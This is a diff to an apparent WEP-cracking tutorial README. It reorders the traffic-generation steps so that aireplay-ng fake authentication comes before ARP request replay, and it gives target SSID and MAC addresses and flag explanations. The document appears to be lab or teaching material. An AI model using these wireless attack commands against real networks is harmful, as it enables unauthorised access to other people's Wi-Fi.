@@ -126,6 +126,14 @@ Capture wireless packet:
 
 Generate traffic:
 
+> #aireplay-ng -1 0 -e LETHIHUYEN\* -a 72:F4:C2:D1:75:08 -h E0:62:67:49:0D:7A wlan0
+>
+>> -1 means fake authentication
+>>
+>> 0 reassociation timing in seconds
+
+![generate traffic](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/generate-traffic-2.png)
+
 > #aireplay-ng -3 -b 72:F4:C2:D1:75:08 -h E0:62:67:49:0D:74 wlan0
 >
 >> -3 means standard arp request replay
@@ -136,13 +144,6 @@ Generate traffic:
 
 ![generate traffic](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/generate-traffic-1.png)
 
-> #aireplay-ng -1 0 -e LETHIHUYEN\* -a 72:F4:C2:D1:75:08 -h E0:62:67:49:0D:7A wlan0
->
->> -1 means fake authentication
->>
->> 0 reassociation timing in seconds
-
-![generate traffic](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/generate-traffic-2.png)
 
 ### Step 4: Cracking WEP
 
